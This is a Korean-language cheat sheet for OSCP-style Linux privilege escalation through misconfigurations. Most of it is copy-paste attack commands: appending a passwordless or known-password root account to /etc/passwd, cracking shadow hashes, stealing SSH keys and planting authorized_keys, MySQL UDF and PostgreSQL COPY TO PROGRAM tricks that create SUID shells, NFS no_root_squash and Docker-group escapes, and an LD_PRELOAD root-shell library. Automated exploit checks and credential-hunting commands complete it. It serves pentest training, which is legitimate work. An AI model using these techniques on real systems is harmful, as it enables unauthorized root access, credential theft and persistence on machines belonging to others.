# Linux Common Misconfigurations Privilege Escalation

> **OSCP 핵심**: 일반적인 시스템 설정 오류를 악용하여 즉시 root 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 파일 권한 설정 오류 (30초 안에)

```bash
# 가장 중요한 파일들 권한 확인
ls -la /etc/passwd /etc/shadow /etc/group
ls -la /etc/sudoers /etc/sudoers.d/
ls -la /root/.ssh/ /home/*/.ssh/ 2>/dev/null

# World-writable 파일들
find / -type f -perm -002 2>/dev/null | head -20
find / -type f -perm -222 2>/dev/null | head -10

# 사용자가 소유한 root 그룹 파일들
find / -group root -user $(whoami) 2>/dev/null | head -20
```

### 🎯 서비스 설정 오류 (즉시 체크)

```bash
# MySQL/MariaDB 패스워드 없는 접근
mysql -u root
mysql -u root -p''
mysql -u '' -p''

# SSH 키 기반 접근
find / -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# NFS 마운트 확인
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
```

### ⚡ 네트워크 및 파일시스템 (즉시)

```bash
# NFS exports 설정 확인
exportfs -v 2>/dev/null
cat /proc/mounts | grep nfs

# Samba/SMB 설정
cat /etc/samba/smb.conf 2>/dev/null | grep -E "(guest|anonymous|public)"
smbclient -L localhost -N 2>/dev/null

# FTP 익명 접근
ftp localhost
# anonymous 로그인 시도
```

## 📋 단계별 체크리스트

### Phase 1: 파일 시스템 권한 (2분)

- [ ] **중요 파일 권한**: `/etc/passwd`, `/etc/shadow` 쓰기/읽기 권한
- [ ] **SSH 키 권한**: 개인키 파일들의 권한과 위치
- [ ] **설정 파일 권한**: 서비스 설정파일들의 권한 오류
- [ ] **World-writable**: 모든 사용자가 쓸 수 있는 파일들
- [ ] **그룹 권한**: 특수 그룹 파일들의 접근 권한

### Phase 2: 서비스 설정 오류 (3분)

- [ ] **데이터베이스**: MySQL, PostgreSQL 패스워드 없는 접근
- [ ] **웹 서버**: Apache, Nginx 설정 파일 노출
- [ ] **SSH 설정**: 키 기반 인증, root 로그인 허용
- [ ] **메일 서버**: 설정 파일 접근 권한
- [ ] **DNS 설정**: bind 등 DNS 서버 설정

### Phase 3: 네트워크 서비스 (2분)

- [ ] **NFS**: exports 설정과 no_root_squash 옵션
- [ ] **Samba/SMB**: 익명 접근 및 공유 설정
- [ ] **FTP**: 익명 접근 허용 여부
- [ ] **SNMP**: 기본 커뮤니티 스트링 사용
- [ ] **VNC/RDP**: 패스워드 없는 접근

### Phase 4: 환경 및 라이브러리 (2분)

- [ ] **환경 변수**: LD_PRELOAD, PATH 설정 오류
- [ ] **라이브러리 경로**: 사용자 정의 라이브러리 로드
- [ ] **Python/Perl 경로**: 모듈 하이재킹 가능성
- [ ] **Docker 그룹**: 사용자의 docker 그룹 가입
- [ ] **특수 그룹**: lxd, disk, shadow 등 그룹 가입

## 🎯 발견별 즉시 익스플로잇

### 📝 /etc/passwd 쓰기 권한

```bash
# 1. 권한 확인
ls -la /etc/passwd

# 2. 백업 생성
cp /etc/passwd /tmp/passwd.bak

# 3. root 계정 추가 (패스워드: root)
echo 'hacker:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:0:0:root:/root:/bin/bash' >> /etc/passwd

# 4. 새 계정으로 로그인
su hacker  # password: root

# 또는 패스워드 없는 root 계정
echo 'roothack::0:0:root:/root:/bin/bash' >> /etc/passwd
su roothack
```

### 🔐 /etc/shadow 읽기 권한

```bash
# 1. 권한 확인
ls -la /etc/shadow

# 2. shadow 파일 내용 확인
cat /etc/shadow

# 3. 해시 추출 및 크랙
cat /etc/shadow | grep root
# John the Ripper로 크랙
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# 4. 빈 패스워드 계정 찾기
cat /etc/shadow | grep -E "^[^:]*::"
```

### 🗝️ SSH 키 오용

```bash
# 1. SSH 키 파일 찾기
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# 2. 읽기 가능한 개인키 확인
find / -name "id_rsa*" -readable 2>/dev/null
cat /home/user/.ssh/id_rsa 2>/dev/null

# 3. SSH로 접속 시도
chmod 600 /tmp/stolen_key
ssh -i /tmp/stolen_key root@localhost
ssh -i /tmp/stolen_key user@localhost

# 4. authorized_keys 파일 수정 가능시
echo 'ssh-rsa YOUR_PUBLIC_KEY root@kali' >> /root/.ssh/authorized_keys
echo 'ssh-rsa YOUR_PUBLIC_KEY root@kali' >> /home/user/.ssh/authorized_keys
```

### 🗄️ 데이터베이스 접근 오류

```bash
# 1. MySQL 패스워드 없는 접근
mysql -u root
mysql -u root -p''
mysql -u '' -p''

# 2. MySQL 권한상승
mysql -u root -e "use mysql; update user set authentication_string=PASSWORD('newpass') where User='root'; flush privileges;"

# 3. UDF (User Defined Function) 익스플로잇
mysql -u root -e "CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';"
mysql -u root -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');"

# 4. PostgreSQL 접근
psql -U postgres
psql -U postgres -h localhost -p 5432

# 5. PostgreSQL 명령 실행
psql -U postgres -c "COPY (SELECT '') TO PROGRAM 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash';"
```

### 🌐 NFS 설정 오류

```bash
# 1. NFS exports 확인
cat /etc/exports
showmount -e localhost

# 2. no_root_squash 옵션 확인
cat /etc/exports | grep "no_root_squash"

# 3. NFS 마운트 (공격자 머신에서)
mkdir /tmp/nfs_mount
mount -t nfs victim-ip:/exported/path /tmp/nfs_mount

# 4. SUID 바이너리 생성 (공격자 머신에서 root로)
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# 5. 타겟에서 실행
/exported/path/rootbash -p
```

### 🐋 Docker 그룹 악용

```bash
# 1. Docker 그룹 확인
groups | grep docker
id | grep docker

# 2. Docker 컨테이너 실행으로 root 권한 획득
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 3. Docker를 통한 호스트 파일시스템 접근
docker run -v /etc:/mnt/etc --rm -it alpine sh
# 컨테이너 내에서 /mnt/etc/passwd 수정 가능

# 4. Docker 이미지를 통한 권한상승
docker run --rm -v /:/mnt -it ubuntu bash
chroot /mnt bash
```

### 🔧 LD_PRELOAD 악용

```bash
# 1. LD_PRELOAD 설정 가능 여부 확인
sudo -l | grep LD_PRELOAD
env | grep LD_PRELOAD

# 2. 악성 라이브러리 생성
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 3. 컴파일
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles

# 4. 실행
sudo LD_PRELOAD=/tmp/preload.so program_name
```

### 📁 World-writable 디렉토리 악용

```bash
# 1. World-writable 디렉토리 찾기
find / -type d -perm -002 2>/dev/null | grep -v proc

# 2. /tmp 스티키 비트 없을 때
ls -ld /tmp
# drwxrwxrwx (스티키 비트 없음)이면 악용 가능

# 3. 다른 사용자 프로세스가 사용하는 파일 교체
lsof | grep /tmp
ps aux | grep -E "(tmp|var)"

# 4. 심볼릭 링크 공격
ln -sf /etc/passwd /tmp/target_file
# 다른 프로세스가 /tmp/target_file에 쓸 때 /etc/passwd 수정됨
```

### 🔍 SUID/GUID 디렉토리 악용

```bash
# 1. SUID/GUID 디렉토리 찾기
find / -type d -perm -4000 -o -perm -2000 2>/dev/null

# 2. 그룹 쓰기 권한이 있는 GUID 디렉토리
find / -type d -perm -2000 -group $(id -gn) 2>/dev/null

# 3. 해당 디렉토리에 악성 스크립트 생성
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /guid_dir/script.sh
chmod +x /guid_dir/script.sh
```

## 🤖 자동화 도구 활용

### 🔍 설정 오류 종합 스캔

```bash
# 종합 misconfiguration 스캔 스크립트 (복붙용)
misconfig_scan() {
    echo "=== LINUX MISCONFIGURATION SCAN ==="

    echo "[+] File permissions check:"
    ls -la /etc/passwd /etc/shadow /etc/group 2>/dev/null

    echo -e "\n[+] World-writable files:"
    find / -type f -perm -002 2>/dev/null | head -10

    echo -e "\n[+] SUID/GUID files:"
    find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -10

    echo -e "\n[+] User SSH keys:"
    find / -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null

    echo -e "\n[+] Database access:"
    mysql -u root -e "SELECT 'MySQL root access successful';" 2>/dev/null
    psql -U postgres -c "SELECT 'PostgreSQL postgres access successful';" 2>/dev/null

    echo -e "\n[+] NFS exports:"
    cat /etc/exports 2>/dev/null

    echo -e "\n[+] Group memberships:"
    groups
    id

    echo -e "\n[+] Docker access:"
    docker ps 2>/dev/null && echo "Docker access available"

    echo -e "\n[+] Sudo configuration:"
    sudo -l 2>/dev/null
}

# 실행
misconfig_scan
```

### 🎯 자동 익스플로잇 테스트

```bash
# 자동 misconfiguration 익스플로잇 테스트 (복붙용)
auto_misconfig_exploit() {
    echo "=== AUTOMATED MISCONFIGURATION EXPLOITS ==="

    # /etc/passwd 쓰기 권한 테스트
    if [ -w /etc/passwd ]; then
        echo "[!] /etc/passwd is writable!"
        echo "Exploit: echo 'hacker:\$6\$salt\$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
    fi

    # /etc/shadow 읽기 권한 테스트
    if [ -r /etc/shadow ]; then
        echo "[!] /etc/shadow is readable!"
        echo "Exploit: Extract and crack password hashes"
    fi

    # MySQL 접근 테스트
    if mysql -u root -e "SELECT 1;" 2>/dev/null; then
        echo "[!] MySQL root access without password!"
        echo "Exploit: UDF or privilege escalation via MySQL"
    fi

    # Docker 그룹 테스트
    if groups | grep -q docker; then
        echo "[!] User is in docker group!"
        echo "Exploit: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    fi

    # NFS no_root_squash 테스트
    if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
        echo "[!] NFS with no_root_squash found!"
        echo "Exploit: Mount NFS and create SUID binary"
    fi

    # SSH 키 접근 테스트
    ssh_keys=$(find /home -name "id_rsa" -readable 2>/dev/null)
    if [ ! -z "$ssh_keys" ]; then
        echo "[!] Readable SSH private keys found:"
        echo "$ssh_keys"
    fi
}

# 실행
auto_misconfig_exploit
```

### 🔧 LinPEAS misconfiguration 정보

```bash
# LinPEAS에서 misconfiguration 관련 정보만 추출
./linpeas.sh | grep -A 10 -B 5 -E "(writable|SUID|docker|mysql|ssh)"

# 특정 섹션만 실행
./linpeas.sh -o UsrI,SofI,IntFiles | grep -E "(writable|password|key)"
```

## 👀 놓치기 쉬운 것들

### 🚨 숨겨진 설정 파일들

```bash
# 1. 숨겨진 설정 파일들
find /etc -name ".*" -type f 2>/dev/null | head -20
find /home -name ".*" -type f 2>/dev/null | head -20

# 2. 백업 설정 파일들
find /etc -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" 2>/dev/null
find / -name "*.conf.bak" -o -name "*.cfg.old" 2>/dev/null | head -20

# 3. 임시 설정 파일들
find /tmp /var/tmp -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null

# 4. 개발/테스트 설정 파일들
find / -name "*test*" -name "*.conf" 2>/dev/null | head -10
find / -name "*dev*" -name "*.cfg" 2>/dev/null | head -10

# 5. 웹 애플리케이션 설정 파일들
find /var/www -name "*.conf" -o -name "config.*" -o -name "*.ini" 2>/dev/null
find /opt -name "*.conf" -o -name "config.*" 2>/dev/null | head -10
```

### 🔍 로그 파일에서 패스워드 찾기

```bash
# 1. 로그 파일들에서 패스워드 검색
grep -r -i "password" /var/log/ 2>/dev/null | head -10
grep -r -i "pass" /var/log/ 2>/dev/null | head -10
grep -r -i "pwd" /var/log/ 2>/dev/null | head -5

# 2. 히스토리 파일들
find /home -name ".*history" 2>/dev/null -exec grep -l "pass\|pwd\|su\|sudo" {} \;
cat ~/.bash_history ~/.zsh_history ~/.python_history 2>/dev/null | grep -i pass

# 3. 애플리케이션 로그에서 크리덴셜
find /var/log -name "*.log" -exec grep -l "username\|password\|login" {} \; 2>/dev/null | head -10

# 4. 메일 스풀에서 정보
find /var/mail /var/spool/mail -readable 2>/dev/null -exec grep -l "pass" {} \;

# 5. 크래시 덤프나 코어 파일
find / -name "core" -o -name "*.core" -o -name "*.dump" 2>/dev/null | head -10
strings /var/crash/* 2>/dev/null | grep -i pass | head -5
```

### 🔧 서비스별 특수 설정 오류

```bash
# 1. Apache/Nginx 설정 오류
find /etc/apache2 /etc/nginx -name "*.conf" -readable 2>/dev/null
grep -r "AllowOverride All" /etc/apache2/ 2>/dev/null
grep -r "autoindex on" /etc/nginx/ 2>/dev/null

# 2. PHP 설정 오류
find / -name "php.ini" 2>/dev/null -exec grep -E "(display_errors|expose_php|allow_url_include)" {} \;

# 3. Mail 서버 설정
cat /etc/postfix/main.cf 2>/dev/null | grep -E "(relay|auth)"
cat /etc/dovecot/dovecot.conf 2>/dev/null | grep -E "(auth|login)"

# 4. DNS 서버 설정
cat /etc/bind/named.conf* 2>/dev/null | grep -E "(allow-transfer|allow-query)"

# 5. LDAP 설정
cat /etc/ldap/ldap.conf 2>/dev/null
find /etc -name "*ldap*" -type f 2>/dev/null

# 6. 가상화 설정
cat /etc/libvirt/qemu.conf 2>/dev/null | grep user
ls -la /var/lib/libvirt/ 2>/dev/null

# 7. 컨테이너 런타임 설정
cat /etc/docker/daemon.json 2>/dev/null
cat /etc/containerd/config.toml 2>/dev/null

# 8. 모니터링 도구 설정
find /etc -name "*zabbix*" -o -name "*nagios*" -o -name "*icinga*" 2>/dev/null
cat /etc/snmp/snmpd.conf 2>/dev/null | grep community
```

### ⚡ 환경 변수 및 라이브러리 경로

```bash
# 1. 모든 환경 변수 확인
env | grep -E "(PATH|LD_|PYTHON|PERL|RUBY)"
printenv | grep -E "(HOME|USER|SHELL)"

# 2. 동적 라이브러리 경로
cat /etc/ld.so.conf 2>/dev/null
ls -la /etc/ld.so.conf.d/ 2>/dev/null
ldconfig -v 2>/dev/null | head -20

# 3. Python 라이브러리 경로
python -c "import sys; print('\n'.join(sys.path))" 2>/dev/null
python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null

# 4. Perl 라이브러리 경로
perl -e 'print join("\n", @INC)' 2>/dev/null

# 5. Ruby gem 경로
gem environment 2>/dev/null | grep -E "(GEM PATH|GEM ROOT)"

# 6. Node.js 모듈 경로
npm root -g 2>/dev/null
node -e "console.log(module.paths)" 2>/dev/null

# 7. Java 클래스패스
echo $CLASSPATH
java -XshowSettings:properties 2>&1 | grep java.class.path

# 8. 사용자 정의 라이브러리 디렉토리
find /usr/local/lib /opt -name "*.so*" 2>/dev/null | head -10
```

### 🔍 프로세스 및 서비스 분석

```bash
# 1. root로 실행되는 사용자 프로세스들
ps aux | grep root | grep -v "\[.*\]" | head -10

# 2. 비표준 서비스들
systemctl list-units --type=service --state=running | grep -v -E "(systemd|dbus|NetworkManager)"

# 3. 포트를 바인딩한 프로세스들
netstat -tulnp 2>/dev/null | grep LISTEN
ss -tulnp 2>/dev/null | grep LISTEN

# 4. 실행 중인 컨테이너나 가상머신
docker ps 2>/dev/null
lxc list 2>/dev/null
virsh list 2>/dev/null

# 5. 스케줄된 작업들
systemctl list-timers 2>/dev/null
at -l 2>/dev/null

# 6. 마운트된 파일시스템
mount | grep -v -E "(proc|sys|dev|run)"
cat /proc/mounts | grep -E "(nfs|cifs|sshfs)"

# 7. 네트워크 연결 상태
netstat -an 2>/dev/null | grep ESTABLISHED
ss -an 2>/dev/null | grep ESTAB

# 8. 로드된 커널 모듈
lsmod | grep -v -E "(video|sound|usb|hid)"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: 파일 권한 및 주요 설정 파일 확인
- **다음 3분**: 서비스 설정 오류 및 데이터베이스 접근 테스트
- **추가 2분**: 네트워크 서비스 및 특수 그룹 권한 확인
- **5분 후**: 숨겨진 설정이나 로그에서 정보 수집

### 🎯 성공률 높은 순서

1. **파일 권한 오류**: `/etc/passwd` 쓰기, `/etc/shadow` 읽기 (거의 확실)
2. **Docker 그룹**: 발견시 즉시 root 권한 (매우 높은 성공률)
3. **데이터베이스 접근**: MySQL/PostgreSQL 패스워드 없는 접근
4. **NFS 설정**: `no_root_squash` 옵션으로 root 권한
5. **SSH 키 오용**: 읽기 가능한 개인키로 다른 계정 접근

### 🔥 즉시 시도할 것들

- `/etc/passwd`, `/etc/shadow` 권한 우선 확인
- `groups` 명령어로 docker, lxd 등 특수 그룹 가입 확인
- MySQL root 접근 즉시 테스트
- SSH 키 파일들 읽기 권한 확인

### 💡 팁

- Misconfiguration은 OSCP에서 가장 흔한 권한상승 벡터
- 여러 설정 오류가 동시에 존재할 수 있으므로 체계적으로 확인
- 자동화 도구와 수동 확인을 병행하여 놓치는 부분 최소화
- 설정 백업 파일들도 반드시 확인 (이전 취약한 설정 보존)
- 성공 후 다른 misconfiguration도 확인하여 지속성 확보
